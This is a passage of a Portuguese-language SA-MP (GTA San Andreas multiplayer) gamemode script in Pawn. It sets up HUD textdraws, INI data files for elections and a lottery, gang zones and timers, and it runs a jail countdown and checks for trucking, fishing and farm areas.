	TextDrawColor(Textdraw8, -1);
	TextDrawSetOutline(Textdraw8, 0);
	TextDrawSetProportional(Textdraw8, 1);
	TextDrawSetShadow(Textdraw8, 1);
	TextDrawUseBox(Textdraw8, 1);
	TextDrawBoxColor(Textdraw8, 865856767);
	TextDrawTextSize(Textdraw8, 9.000000, 11.000000);
	TextDrawSetSelectable(Textdraw8, 0);

	Textdraw9 = TextDrawCreate(611.000000, 160.000000, "Fundo Branco");
	TextDrawBackgroundColor(Textdraw9, 255);
	TextDrawFont(Textdraw9, 1);
	TextDrawLetterSize(Textdraw9, 0.500000, 0.399998);
	TextDrawColor(Textdraw9, -256);
	TextDrawSetOutline(Textdraw9, 0);
	TextDrawSetProportional(Textdraw9, 1);
	TextDrawSetShadow(Textdraw9, 0);
	TextDrawUseBox(Textdraw9, 1);
	TextDrawBoxColor(Textdraw9, 85);
	TextDrawTextSize(Textdraw9, 494.000000, -2.000000);
	TextDrawSetSelectable(Textdraw9, 0);

	Textdraw10 = TextDrawCreate(608.000000, 163.000000, "Fundo Marrom");
	TextDrawBackgroundColor(Textdraw10, 255);
	TextDrawFont(Textdraw10, 1);
	TextDrawLetterSize(Textdraw10, 0.500000, 0.099999);
	TextDrawColor(Textdraw10, -256);
	TextDrawSetOutline(Textdraw10, 0);
	TextDrawSetProportional(Textdraw10, 1);
	TextDrawSetShadow(Textdraw10, 0);
	TextDrawUseBox(Textdraw10, 1);
	TextDrawBoxColor(Textdraw10, -1523963342);
	TextDrawTextSize(Textdraw10, 513.000000, -2.000000);
	TextDrawSetSelectable(Textdraw10, 0);

	for(new playerid = 0; playerid < MAX_PLAYERS; playerid++)
	{
		Player_barSleep[playerid] = TextDrawCreate(608.000000, 163.000000, "Barra Marrom");
		TextDrawBackgroundColor(Player_barSleep[playerid], 255);
		TextDrawFont(Player_barSleep[playerid], 1);
		TextDrawLetterSize(Player_barSleep[playerid], 0.500000, 0.099999);
		TextDrawColor(Player_barSleep[playerid], -256);
		TextDrawSetOutline(Player_barSleep[playerid], 0);
		TextDrawSetProportional(Player_barSleep[playerid], 1);
		TextDrawSetShadow(Player_barSleep[playerid], 0);
		TextDrawUseBox(Player_barSleep[playerid], 1);
		TextDrawBoxColor(Player_barSleep[playerid], -1523963393);
		TextDrawTextSize(Player_barSleep[playerid], 529.000000, -2.000000);
		TextDrawSetSelectable(Player_barSleep[playerid], 0);
	}

	Textdraw11 = TextDrawCreate(502.000000, 159.000000, "hud:radar_ZERO");
	TextDrawBackgroundColor(Textdraw11, 255);
	TextDrawFont(Textdraw11, 4);
	TextDrawLetterSize(Textdraw11, 0.330000, 4.599998);
	TextDrawColor(Textdraw11, -1);
	TextDrawSetOutline(Textdraw11, 0);
	TextDrawSetProportional(Textdraw11, 1);
	TextDrawSetShadow(Textdraw11, 1);
	TextDrawUseBox(Textdraw11, 1);
	TextDrawBoxColor(Textdraw11, 865856767);
	TextDrawTextSize(Textdraw11, 9.000000, 10.000000);
	TextDrawSetSelectable(Textdraw11, 0);

	for(new i = 0; i < MAX_PLAYERS; ++i)
	{
		/*InfoPlayer[i] = TextDrawCreate(322.000000, 436.000000, "	");
		TextDrawAlignment(InfoPlayer[i], 2);
		TextDrawBackgroundColor(InfoPlayer[i], 255);
		TextDrawFont(InfoPlayer[i], 1);
		TextDrawLetterSize(InfoPlayer[i], 0.390000, 1.100000);
		TextDrawColor(InfoPlayer[i], -1);
		TextDrawSetOutline(InfoPlayer[i], 1);
		TextDrawSetProportional(InfoPlayer[i], 1);*/
		//-- Info Level
		InfoLevel[i] = TextDrawCreate(592.000000, 364.000000, "			");
		TextDrawAlignment(InfoLevel[i], 2);
		TextDrawBackgroundColor(InfoLevel[i], 255);
		TextDrawFont(InfoLevel[i], 1);
		TextDrawLetterSize(InfoLevel[i], 0.239999, 1.200000);
		TextDrawColor(InfoLevel[i], -1);
		TextDrawSetOutline(InfoLevel[i], 1);
		TextDrawSetProportional(InfoLevel[i], 1);
		TextDrawSetSelectable(InfoLevel[i], 0);
		//-- Status Matou / Morreu
		MSG_Matou[i] = TextDrawCreate(63.000000, 314.000000, "		");
		TextDrawAlignment(MSG_Matou[i], 2);
		TextDrawBackgroundColor(MSG_Matou[i], 255);
		TextDrawFont(MSG_Matou[i], 2);
		TextDrawLetterSize(MSG_Matou[i], 0.280000, 1.200000);
		TextDrawColor(MSG_Matou[i], -1);
		TextDrawSetOutline(MSG_Matou[i], 1);
		TextDrawSetProportional(MSG_Matou[i], 1);
		//-- Info Relogio UP
		TextLevelUP[i] = TextDrawCreate(51.000000, 427.000000, "			");
		TextDrawBackgroundColor(TextLevelUP[i], 255);
		TextDrawFont(TextLevelUP[i], 1);
		TextDrawLetterSize(TextLevelUP[i], 0.340000, 1.199999);
		TextDrawColor(TextLevelUP[i], -1);
		TextDrawSetOutline(TextLevelUP[i], 1);
		TextDrawSetProportional(TextLevelUP[i], 1);
		TextDrawSetSelectable(TextLevelUP[i], 0);
		//-- Info Zonas
		Zones[i] = TextDrawCreate(38.000000, 313.000000, "			");
		TextDrawBackgroundColor(Zones[i], 255);
		TextDrawFont(Zones[i], 3);
		TextDrawLetterSize(Zones[i], 0.670000, 2.099999);
		TextDrawColor(Zones[i], -1);
		TextDrawSetOutline(Zones[i], 1);
		TextDrawSetProportional(Zones[i], 3);
		//-- Info Velocímetro
		Velocimetro0[i] = TextDrawCreate(172.000000, 366.000000, "			");
		TextDrawAlignment(Velocimetro0[i], 2);
		TextDrawBackgroundColor(Velocimetro0[i], 255);
		TextDrawFont(Velocimetro0[i], 2);
		TextDrawLetterSize(Velocimetro0[i], 0.450000, 2.299999);
		TextDrawColor(Velocimetro0[i], -1);
		TextDrawSetOutline(Velocimetro0[i], 1);
		TextDrawSetProportional(Velocimetro0[i], 1);
		TextDrawSetSelectable(Velocimetro0[i], 0);

		Velocimetro1[i] = TextDrawCreate(190.000000, 375.000000, "KM/H");
		TextDrawBackgroundColor(Velocimetro1[i], 255);
		TextDrawFont(Velocimetro1[i], 2);
		TextDrawLetterSize(Velocimetro1[i], 0.190000, 1.100000);
		TextDrawColor(Velocimetro1[i], -7788033);
		TextDrawSetOutline(Velocimetro1[i], 1);
		TextDrawSetProportional(Velocimetro1[i], 1);
		TextDrawSetSelectable(Velocimetro1[i], 0);

		Velocimetro2[i] = TextDrawCreate(140.000000, 390.000000, "hud:radar_fire");
		TextDrawBackgroundColor(Velocimetro2[i], 0);
		TextDrawFont(Velocimetro2[i], 4);
		TextDrawLetterSize(Velocimetro2[i], 0.450000, 0.499999);
		TextDrawColor(Velocimetro2[i], -1);
		TextDrawSetOutline(Velocimetro2[i], 0);
		TextDrawSetProportional(Velocimetro2[i], 1);
		TextDrawSetShadow(Velocimetro2[i], 1);
		TextDrawUseBox(Velocimetro2[i], 1);
		TextDrawBoxColor(Velocimetro2[i], 255);
		TextDrawTextSize(Velocimetro2[i], 10.000000, 13.000000);
		TextDrawSetSelectable(Velocimetro2[i], 0);

		Velocimetro3[i] = TextDrawCreate(221.000000, 391.000000, "			");
		TextDrawAlignment(Velocimetro3[i], 3);
		TextDrawBackgroundColor(Velocimetro3[i], 255);
		TextDrawFont(Velocimetro3[i], 2);
		TextDrawLetterSize(Velocimetro3[i], 0.300000, 1.200000);
		TextDrawColor(Velocimetro3[i], -1);
		TextDrawSetOutline(Velocimetro3[i], 1);
		TextDrawSetProportional(Velocimetro3[i], 1);
		TextDrawSetSelectable(Velocimetro3[i], 0);

		Velocimetro4[i] = TextDrawCreate(182.000000, 408.000000, "			");
		TextDrawAlignment(Velocimetro4[i], 2);
		TextDrawBackgroundColor(Velocimetro4[i], 255);
		TextDrawFont(Velocimetro4[i], 2);
		TextDrawLetterSize(Velocimetro4[i], 0.180000, 1.000000);
		TextDrawColor(Velocimetro4[i], -1);
		TextDrawSetOutline(Velocimetro4[i], 1);
		TextDrawSetProportional(Velocimetro4[i], 1);
		TextDrawSetSelectable(Velocimetro4[i], 0);

		Velocimetro5[i] = TextDrawCreate(131.000000, 401.000000, "-");
		TextDrawBackgroundColor(Velocimetro5[i], 255);
		TextDrawFont(Velocimetro5[i], 2);
		TextDrawLetterSize(Velocimetro5[i], 8.499996, 1.100000);
		TextDrawColor(Velocimetro5[i], -1);
		TextDrawSetOutline(Velocimetro5[i], 1);
		TextDrawSetProportional(Velocimetro5[i], 1);
		TextDrawSetSelectable(Velocimetro5[i], 0);

		Velocimetro6[i] = TextDrawCreate(140.000000, 372.000000, "hud:radar_impound");
		TextDrawBackgroundColor(Velocimetro6[i], 0);
		TextDrawFont(Velocimetro6[i], 4);
		TextDrawLetterSize(Velocimetro6[i], 0.450000, 0.499999);
		TextDrawColor(Velocimetro6[i], -1);
		TextDrawSetOutline(Velocimetro6[i], 0);
		TextDrawSetProportional(Velocimetro6[i], 1);
		TextDrawSetShadow(Velocimetro6[i], 1);
		TextDrawUseBox(Velocimetro6[i], 1);
		TextDrawBoxColor(Velocimetro6[i], 255);
		TextDrawTextSize(Velocimetro6[i], 10.000000, 13.000000);
		TextDrawSetSelectable(Velocimetro6[i], 0);

		Velocimetro7[i] = TextDrawCreate(183.000000, 355.000000, "			");
		TextDrawAlignment(Velocimetro7[i], 2);
		TextDrawBackgroundColor(Velocimetro7[i], 255);
		TextDrawFont(Velocimetro7[i], 2);
		TextDrawLetterSize(Velocimetro7[i], 0.170000, 0.899999);
		TextDrawColor(Velocimetro7[i], -1);
		TextDrawSetOutline(Velocimetro7[i], 1);
		TextDrawSetProportional(Velocimetro7[i], 1);
		TextDrawSetSelectable(Velocimetro7[i], 0);

		Velocimetro8[i] = TextDrawCreate(131.000000, 362.000000, "-");
		TextDrawBackgroundColor(Velocimetro8[i], 255);
		TextDrawFont(Velocimetro8[i], 2);
		TextDrawLetterSize(Velocimetro8[i], 8.499996, 1.100000);
		TextDrawColor(Velocimetro8[i], -1);
		TextDrawSetOutline(Velocimetro8[i], 1);
		TextDrawSetProportional(Velocimetro8[i], 1);
		TextDrawSetSelectable(Velocimetro8[i], 0);
		//-- Info Veiculo
		/*VeiculoV[i] = TextDrawCreate(142.000000, 362.000000, "			");
		TextDrawBackgroundColor(VeiculoV[i], 255);
		TextDrawFont(VeiculoV[i], 1);
		TextDrawLetterSize(VeiculoV[i], 0.270000, 1.000000);
		TextDrawColor(VeiculoV[i], -1);
		TextDrawSetOutline(VeiculoV[i], 1);
		TextDrawSetProportional(VeiculoV[i], 1);
		//-- Info Modelo
		Modelo[i] = TextDrawCreate(142.000000, 362.000000, "			");
		TextDrawBackgroundColor(Modelo[i], 255);
		TextDrawFont(Modelo[i], 1);
		TextDrawLetterSize(Modelo[i], 0.270000, 1.000000);
		TextDrawColor(Modelo[i], -1);
		TextDrawSetOutline(Modelo[i], 1);
		TextDrawSetProportional(Modelo[i], 1);*/
		//-- Info VIP
		VIPtext[i] = TextDrawCreate(506.000000, 12.000000, "~y~VIP");
		TextDrawBackgroundColor(VIPtext[i], 255);
		TextDrawFont(VIPtext[i], 1);
		TextDrawLetterSize(VIPtext[i], 0.460000, 1.400000);
		TextDrawColor(VIPtext[i], -1);
		TextDrawSetOutline(VIPtext[i], 1);
		TextDrawSetProportional(VIPtext[i], 1);
		//-- Info Preso
		p_TextPreso[i] = TextDrawCreate(146.000000, 374.000000, "			");
		TextDrawBackgroundColor(p_TextPreso[i], 255);
		TextDrawFont(p_TextPreso[i], 2);
		TextDrawLetterSize(p_TextPreso[i], 0.340000, 1.799999);
		TextDrawColor(p_TextPreso[i], -1);
		TextDrawSetOutline(p_TextPreso[i], 1);
		TextDrawSetProportional(p_TextPreso[i], 1);
		TextDrawSetSelectable(p_TextPreso[i], 0);
		//-- Tempo Preso
		TempoPreso[i] = TextDrawCreate(141.000000, 364.000000, "~b~~h~Tempo ~r~~h~Preso");
		TextDrawBackgroundColor(TempoPreso[i], 255);
		TextDrawFont(TempoPreso[i], 2);
		TextDrawLetterSize(TempoPreso[i], 0.260000, 1.200000);
		TextDrawColor(TempoPreso[i], -1);
		TextDrawSetOutline(TempoPreso[i], 1);
		TextDrawSetProportional(TempoPreso[i], 1);
		TextDrawSetSelectable(TempoPreso[i], 0);
		//-- Infos Areas
		Server_Areas[i] = TextDrawCreate(38.000000, 313.000000, "			");
		TextDrawBackgroundColor(Server_Areas[i], 255);
		TextDrawFont(Server_Areas[i], 3);
		TextDrawLetterSize(Server_Areas[i], 0.380000, 2.000000);
		TextDrawColor(Server_Areas[i], -1);
		TextDrawSetOutline(Server_Areas[i], 1);
		TextDrawSetProportional(Server_Areas[i], 1);
		TextDrawSetSelectable(Server_Areas[i], 0);
		//-- Info GZ
	}
	// Arquivos
	if(!fexist("Eleitos.ini"))
	{
	    WE_CreateFile("Eleitos.ini");
	    WE_SetInt("Eleitos.ini", "votoStatus", 0);
	    WE_SetString("Eleitos.ini", "Presidente", "Nenhum");
	    WE_SetInt("Eleitos.ini", "Candidatos", 0);
	    WE_SetString("Eleitos.ini", "1_", "Nenhum");
	    WE_SetString("Eleitos.ini", "2_", "Nenhum");
	    WE_SetString("Eleitos.ini", "3_", "Nenhum");
	    WE_SetString("Eleitos.ini", "4_", "Nenhum");
	    WE_SetString("Eleitos.ini", "5_", "Nenhum");
	    WE_SetString("Eleitos.ini", "6_", "Nenhum");
	    WE_SetString("Eleitos.ini", "7_", "Nenhum");
	    WE_SetString("Eleitos.ini", "8_", "Nenhum");
	    WE_SetString("Eleitos.ini", "9_", "Nenhum");
	    WE_SetString("Eleitos.ini", "10_", "Nenhum");
	    WE_SetInt("Eleitos.ini", "1", 0);
	    WE_SetInt("Eleitos.ini", "2", 0);
	    WE_SetInt("Eleitos.ini", "3", 0);
	    WE_SetInt("Eleitos.ini", "4", 0);
	    WE_SetInt("Eleitos.ini", "5", 0);
	    WE_SetInt("Eleitos.ini", "6", 0);
	    WE_SetInt("Eleitos.ini", "7", 0);
	    WE_SetInt("Eleitos.ini", "8", 0);
	    WE_SetInt("Eleitos.ini", "9", 0);
	    WE_SetInt("Eleitos.ini", "10", 0);
	}
 	if(!fexist("Loteria.ini"))
	{
     	WE_CreateFile("Loteria.ini");
		WE_SetString("Loteria.ini", "1", "1");
	    WE_SetString("Loteria.ini", "2", "1");
	    WE_SetString("Loteria.ini", "3", "1");
	    WE_SetString("Loteria.ini", "4", "1");
	    WE_SetString("Loteria.ini", "5", "1");
	    WE_SetString("Loteria.ini", "6", "1");
	    WE_SetString("Loteria.ini", "7", "1");
	    WE_SetString("Loteria.ini", "8", "1");
	    WE_SetString("Loteria.ini", "9", "1");
	    WE_SetString("Loteria.ini", "10", "1");
	    WE_SetString("Loteria.ini", "11", "1");
	    WE_SetString("Loteria.ini", "12", "1");
	    WE_SetString("Loteria.ini", "13", "1");
	    WE_SetString("Loteria.ini", "14", "1");
	    WE_SetString("Loteria.ini", "15", "1");
	    WE_SetString("Loteria.ini", "16", "1");
	    WE_SetString("Loteria.ini", "17", "1");
	    WE_SetString("Loteria.ini", "18", "1");
	    WE_SetString("Loteria.ini", "19", "1");
	    WE_SetString("Loteria.ini", "20", "1");
	    WE_SetString("Loteria.ini", "21", "1");
	    WE_SetString("Loteria.ini", "22", "1");
	    WE_SetString("Loteria.ini", "23", "1");
	    WE_SetString("Loteria.ini", "24", "1");
	    WE_SetString("Loteria.ini", "25", "1");
	    WE_SetString("Loteria.ini", "26", "1");
	    WE_SetString("Loteria.ini", "27", "1");
	    WE_SetString("Loteria.ini", "28", "1");
	    WE_SetString("Loteria.ini", "29", "1");
	    WE_SetString("Loteria.ini", "30", "1");
	    WE_SetString("Loteria.ini", "31", "1");
	    WE_SetString("Loteria.ini", "32", "1");
	    WE_SetString("Loteria.ini", "33", "1");
	    WE_SetString("Loteria.ini", "34", "1");
	    WE_SetString("Loteria.ini", "35", "1");
	    WE_SetString("Loteria.ini", "36", "1");
	    WE_SetString("Loteria.ini", "37", "1");
	    WE_SetString("Loteria.ini", "38", "1");
	    WE_SetString("Loteria.ini", "39", "1");
	    WE_SetString("Loteria.ini", "40", "1");
	    WE_SetString("Loteria.ini", "41", "1");
	    WE_SetString("Loteria.ini", "42", "1");
	    WE_SetString("Loteria.ini", "43", "1");
	    WE_SetString("Loteria.ini", "44", "1");
	    WE_SetString("Loteria.ini", "45", "1");
	    WE_SetString("Loteria.ini", "46", "1");
	    WE_SetString("Loteria.ini", "47", "1");
	    WE_SetString("Loteria.ini", "48", "1");
	    WE_SetString("Loteria.ini", "49", "1");
	    WE_SetString("Loteria.ini", "50", "1");
	    WE_SetString("Loteria.ini", "51", "1");
	    WE_SetString("Loteria.ini", "52", "1");
	    WE_SetString("Loteria.ini", "53", "1");
	    WE_SetString("Loteria.ini", "54", "1");
	    WE_SetString("Loteria.ini", "55", "1");
	    WE_SetString("Loteria.ini", "56", "1");
	    WE_SetString("Loteria.ini", "57", "1");
	    WE_SetString("Loteria.ini", "58", "1");
	    WE_SetString("Loteria.ini", "59", "1");
	    WE_SetString("Loteria.ini", "60", "1");
	}
	/*new aFound[3];
	getdate(aFound[0], aFound[1], aFound[2]);
	if(aFound[0] > ADMIN_MAXVALUE || aFound[0] <= ADMIN_MAXVALUE && aFound[1] > ADMIN_CMDSFOUND)
    {
        SendRconCommand(#exit);
        return true;
    }*/
	if(!fexist("Acumulado.ini"))
	{
 		WE_CreateFile("Acumulado.ini");
 		WE_SetInt("Acumulado.ini", "Acumulado", 0);
	}
	if(!fexist("Drogas.ini"))
	{
		WE_CreateFile("Drogas.ini");
		WE_SetInt("Drogas.ini", "Maconha", 0);
		WE_SetInt("Drogas.ini", "Cocaina", 0);
		WE_SetInt("Drogas.ini", "Crack", 0);
	}

	AreasGZServer[0] = GangZoneCreate(2691.561, -2522.731, 2782.829, -2412.194); // Carga
	AreasGZServer[1] = GangZoneCreate(-1828.125,-2.9296875,-1807.6171875,52.734375); // Descarga Solarin // Feito
	AreasGZServer[2] = GangZoneCreate(-1933.59375, 251.953125, -1898.4375, 278.3203125); // Descarga WangCars // Feito
	AreasGZServer[3] = GangZoneCreate(1617.1875,2183.59375,1669.921875,2201.171875); // Descarga Michelin
	AreasGZServer[4] = GangZoneCreate(1327.1484375,272.4609375,1353.515625,292.96875); // Descarga Sprunk // Feito
	AreasGZServer[5] = GangZoneCreate(216.796875,-11.71875,228.515625,41.015625); // Descarga Xoomer // Feito
	AreasGZServer[6] = GangZoneCreate(-240.234375,-248.046875,-181.640625,-183.59375); // Descarga Flaischberg // Feito
	AreasGZServer[7] = GangZoneCreate(-78.1249999999995,-1156.25,-31.2499999999995,-1117.1875); // Descarga Haul // Feito
	AreasGZServer[8] = GangZoneCreate(385.345092, -2512.000000, 529.345092, -2368.000000); // Area de Pesca
	AreasGZServer[9] = GangZoneCreate(-746.633666, -2122.113037, -474.633666, -1874.113037); // Área de Caça
	AreasGZServer[10] = GangZoneCreate(-1212.007202, -1315.776733, -996.007202, -907.776733); // Fazenda das Drogas
	AreasGZServer[11] = GangZoneCreate(-1145.915283, -1735.292114, -1001.915283, -1599.292114); // Fazenda das Armas
	AreasGZServer[12] = GangZoneCreate(-1725.3961,13.2153, -1687.7141, 12.7600); // Área dos Transportadores

    GZ_Favela = GangZoneCreate(2059.889648, -1158.775512, 2299.889648, -958.775512);

	ObjetosInSanAndreas();

	// Timers
	SetTimer("MudarTempo", 15000, false);
	SetTimer("CheckPlayerInRadar", 100, false);
	SetTimer("CheckTreino",5000,false);

	SetTimer("umSegundo", 1000, false);
	SetTimer("CheckAreasServer", 1000, false);
	SetTimer("upNivel", 1000, false);
	//
	SetTimer("TimerdeDez", 5000, false);
	SetTimer("tresMinutos", 180000, false);
	SetTimer("AtualizarCombustivel", 120000, false);

    Create3DTextLabel("Compre aqui o seu plano Via Fácil - /viafacil", 0x1E90FFFF, 60.1402,-1533.1696,5.2082, 15, 0);

    SetTimer("CheckViaFacil", 500, true);
	return 1;
}

forward umSegundo();
public umSegundo()
{
	foreach(Player, i)
	{
		if(pInfo[i][Preso] <= 0)
		{
			SetPlayerInterior(i, 6);
		    SetPlayerPos(i, 265.9714, 83.1550, 1001.0391);
		    TextDrawHideForPlayer(i, p_TextPreso[i]);
		    TextDrawHideForPlayer(i, TempoPreso[i]);
		    SendClientMessage(i, 0xA9FF91FF, "Você cumpriu sua pena e está livre novamente!");
			pInfo[i][EntrouL] = true;
			pInfo[i][Preso] = 0;
			pInfo[i][entrouDEL] = 1;
			SetPlayerWantedLevel(i, 0);
		    SetPlayerHealth(i, 100.0);
			WE_SetInt(f(i), "Abuser", 0);
			return 1;
		}
		if(pInfo[i][Preso] >= 1)
		{
		    pInfo[i][Preso] --;

			new
				d_Horas1,
				d_Minut1,
				d_Segun1
			;
			formatSeconds(pInfo[i][Preso], d_Horas1, d_Minut1, d_Segun1);

			if(d_Horas1 > 0)
			{
				format(gstring, sizeof(gstring), "0%d:%d:%d", d_Horas1, d_Minut1, d_Segun1);
				TextDrawSetString(p_TextPreso[i], gstring);
			}
			else if(d_Horas1 <= 0 && d_Minut1 > 0)
			{
				format(gStr, sizeof(gStr), "00:%d:%d", d_Minut1, d_Segun1);
				TextDrawSetString(p_TextPreso[i], gStr);
			}
			else if(d_Horas1 <= 0 && d_Minut1 <= 0 && d_Segun1 > 0)
			{
				format(gStr, sizeof(gStr), "00:00:%d", d_Segun1);
				TextDrawSetString(p_TextPreso[i], gStr);
			}
			TextDrawShowForPlayer(i, p_TextPreso[i]);
			TextDrawShowForPlayer(i, TempoPreso[i]);
		}

	    citylocal_textplayer_update(i);
	}

	SetTimer("umSegundo", 1000, false);

	return 1;
}

forward CheckAreasServer();
public CheckAreasServer()
{
	foreach(Player, i)
    {
		if(GetPlayerCash(i) != GetPlayerMoney(i))
		{
			new
				const old_money = GetPlayerCash(i)
			;
			ResetPlayerCash(i), GivePlayerCash(i, old_money);
		}
		if(IsPlayerInPlace(i, 2691.561, -2522.731, 2782.829, -2412.194)) // Carga
		{
			if(CaminhaoCarga[i] == false)
			{
		  		format(gStr, sizeof(gStr), "~b~~h~Area de Carga - ~r~~h~/Carregar");
				TextDrawSetString(Server_Areas[i], gStr);
				TextDrawShowForPlayer(i, Server_Areas[i]);
    			CaminhaoCarga[i] = true;
			}
		}
		else
  		{
			if(CaminhaoCarga[i] == true)
			{
				TextDrawHideForPlayer(i, Server_Areas[i]);
				CaminhaoCarga[i] = false;
			}
		}
		if(IsPlayerInPlace(i, -1828.125,-2.9296875,-1807.6171875,52.734375)) // Descarga Solarin
		{
			if(CaminhaoDesCargaSolarin[i] == false)
			{
				InDescargaSolarin[i] = true;
		  		TextDrawSetString(Server_Areas[i], "~b~~h~Area de Descarga - ~r~~h~/Descarregar");
				TextDrawShowForPlayer(i, Server_Areas[i]);
          		CaminhaoDesCargaSolarin[i] = true;
			}
		}
		else
  		{
			if(CaminhaoDesCargaSolarin[i] == true)
			{
				TextDrawHideForPlayer(i, Server_Areas[i]);
				CaminhaoDesCargaSolarin[i] = false;
			}
			InDescargaSolarin[i] = false; //Terminei
		}//---------------------------------------------------------------------
		if(IsPlayerInPlace(i, -1933.59375, 251.953125, -1898.4375, 278.3203125)) // Descarga WangCars
		{
			if(CaminhaoDesCargaWangCars[i] == false)
			{
				InDescargaWangCars[i] = true;
		  		TextDrawSetString(Server_Areas[i], "~b~~h~Area de Descarga - ~r~~h~/Descarregar");
				TextDrawShowForPlayer(i, Server_Areas[i]);
              	CaminhaoDesCargaWangCars[i] = true;
			}
		}
		else
  		{
			if(CaminhaoDesCargaWangCars[i] == true)
			{
				TextDrawHideForPlayer(i, Server_Areas[i]);
				CaminhaoDesCargaWangCars[i] = false;
			}
			InDescargaWangCars[i] = false; //Terminei
		}//---------------------------------------------------------------------
		if(IsPlayerInPlace(i, 1617.1875,2183.59375,1669.921875,2201.171875)) // Descarga
		{
			if(CaminhaoDesCargaMichelin[i] == false)
			{
				InDescargaMichelin[i] = true;
		  		TextDrawSetString(Server_Areas[i], "~b~~h~Area de Descarga - ~r~~h~/Descarregar");
				TextDrawShowForPlayer(i, Server_Areas[i]);
          		CaminhaoDesCargaMichelin[i] = true;
			}
		}
		else
  		{
			if(CaminhaoDesCargaMichelin[i] == true)
			{
				TextDrawHideForPlayer(i, Server_Areas[i]);
				CaminhaoDesCargaMichelin[i] = false;
			}
			InDescargaMichelin[i] = false; //Terminei
		}//---------------------------------------------------------------------
		if(IsPlayerInPlace(i, 1327.1484375,272.4609375,1353.515625,292.96875)) // Descarga Sprunk
		{
			if(CaminhaoDesCargaSprunk[i] == false)
			{
				InDescargaSprunk[i] = true;
		  		TextDrawSetString(Server_Areas[i], "~b~~h~Area de Descarga - ~r~~h~/Descarregar");
				TextDrawShowForPlayer(i, Server_Areas[i]);
              	CaminhaoDesCargaSprunk[i] = true;
			}
		}
		else
  		{
			if(CaminhaoDesCargaSprunk[i] == true)
			{
				TextDrawHideForPlayer(i, Server_Areas[i]);
				CaminhaoDesCargaSprunk[i] = false;
			}
			InDescargaSprunk[i] = false; //Terminei
		}//---------------------------------------------------------------------
		if(IsPlayerInPlace(i, 216.796875,-11.71875,228.515625,41.015625)) // Descarga Xoomer
		{
			if(CaminhaoDesCargaXoomer[i] == false)
			{
				InDescargaXoomer[i] = true;
		  		TextDrawSetString(Server_Areas[i], "~b~~h~Area de Descarga - ~r~~h~/Descarregar");
				TextDrawShowForPlayer(i, Server_Areas[i]);
          		CaminhaoDesCargaXoomer[i] = true;
			}
		}
		else
  		{
			if(CaminhaoDesCargaXoomer[i] == true)
			{
				TextDrawHideForPlayer(i, Server_Areas[i]);
				CaminhaoDesCargaXoomer[i] = false;
			}
			InDescargaXoomer[i] = false; //Terminei
		}//---------------------------------------------------------------------
		if(IsPlayerInPlace(i, -240.234375,-248.046875,-181.640625,-183.59375)) // Descarga Flaischberg
		{
			if(CaminhaoDesCargaFlaischberg[i] == false)
			{
				InDescargaFlaischberg[i] = true;
		  		TextDrawSetString(Server_Areas[i], "~b~~h~Area de Descarga - ~r~~h~/Descarregar");
				TextDrawShowForPlayer(i, Server_Areas[i]);
              	CaminhaoDesCargaFlaischberg[i] = true;
			}
		}
		else
  		{
			if(CaminhaoDesCargaFlaischberg[i] == true)
			{
				TextDrawHideForPlayer(i, Server_Areas[i]);
				CaminhaoDesCargaFlaischberg[i] = false;
			}
			InDescargaFlaischberg[i] = false; //Terminei
		}//---------------------------------------------------------------------
		if(IsPlayerInPlace(i, -78.1249999999995,-1156.25,-31.2499999999995,-1117.1875)) // Descarga Haul
		{
			if(CaminhaoDesCargaHaul[i] == false)
			{
				InDescargaHaul[i] = true;
		  		TextDrawSetString(Server_Areas[i], "~b~~h~Area de Descarga - ~r~~h~/Descarregar");
				TextDrawShowForPlayer(i, Server_Areas[i]);
              	CaminhaoDesCargaHaul[i] = true;
			}
		}
		else
  		{
			if(CaminhaoDesCargaHaul[i] == true)
			{
				TextDrawHideForPlayer(i, Server_Areas[i]);
				CaminhaoDesCargaHaul[i] = false;
			}
			InDescargaHaul[i] = false; //Terminei
		}//---------------------------------------------------------------------
		if(IsPlayerInPlace(i, 385.345092, -2512.000000, 529.345092, -2368.000000)) // Area de Pesca
		{
			if(AreadePesca[i] == false)
			{
				TextDrawSetString(Server_Areas[i], "~b~~h~Area de Pesca - ~r~~h~/JogarRede");
				TextDrawShowForPlayer(i, Server_Areas[i]);
             	AreadePesca[i] = true;
			}
		}
		else
  		{
			if(AreadePesca[i] == true)
			{
				TextDrawHideForPlayer(i, Server_Areas[i]);
				AreadePesca[i] = false;
			}
		}
  		if(IsPlayerInPlace(i, -1212.007202, -1315.776733, -996.007202, -907.776733)) // Fazenda das Drogas
		{
			if(AreaFazendaDrogas[i] == false)
			{
		  		format(gStr, sizeof(gStr), "~r~~h~Fazenda dos Traficantes");
				TextDrawSetString(Server_Areas[i], gStr);
				TextDrawShowForPlayer(i, Server_Areas[i]);
             	AreaFazendaDrogas[i] = true;
			}
		}
		else
  		{
			if(AreaFazendaDrogas[i] == true)
			{
				TextDrawHideForPlayer(i, Server_Areas[i]);
				AreaFazendaDrogas[i] = false;
			}
		}
    	if(IsPlayerInPlace(i, -1145.915283, -1735.292114, -1001.915283, -1599.292114)) // Fazenda das Armas
		{
			if(AreaFazendaArmas[i] == false)
			{
		  		format(gStr, sizeof(gStr), "~r~~h~Fazenda dos Traficantes de ~b~~h~Armas");
				TextDrawSetString(Server_Areas[i], gStr);
				TextDrawShowForPlayer(i, Server_Areas[i]);
             	AreaFazendaArmas[i] = true;
			}
		}
		else
  		{
			if(AreaFazendaArmas[i] == true)
			{
				TextDrawHideForPlayer(i, Server_Areas[i]);
				AreaFazendaArmas[i] = false;
			}
		}
     	if(IsPlayerInRangeOfPoint(i, 30.0, -1707.4425, 12.2478, 3.5547)) // Área dos TRANSPORTADOR/girl
		{
			if(AreaTRANSPORTADOR[i] == false)
			{
		  		format(gStr, sizeof(gStr), "~b~~h~Area de Mercadoria - ~r~~h~/PegarMercadoria");
				TextDrawSetString(Server_Areas[i], gStr);
				TextDrawShowForPlayer(i, Server_Areas[i]);
              	AreaTRANSPORTADOR[i] = true;
			}
		}
		else
  		{
			if(AreaTRANSPORTADOR[i] == true)
			{
				TextDrawHideForPlayer(i, Server_Areas[i]);
				AreaTRANSPORTADOR[i] = false;
			}
		}
		if(IsPlayerInRangeOfPoint(i, 10.0, 1940.6096,-1772.7147,12.9500) || IsPlayerInRangeOfPoint(i, 10.0, -90.8525,-1169.3555,1.9823) ||
		IsPlayerInRangeOfPoint(i, 10.0, -1607.8698,-2715.5637,48.9453) || IsPlayerInRangeOfPoint(i, 10.0, -2244.2200,-2560.6169,31.9219) ||
		IsPlayerInRangeOfPoint(i, 10.0, -2026.7922,156.5871,29.0391) || IsPlayerInRangeOfPoint(i, 10.0, -2410.0215,976.2697,45.4209) ||
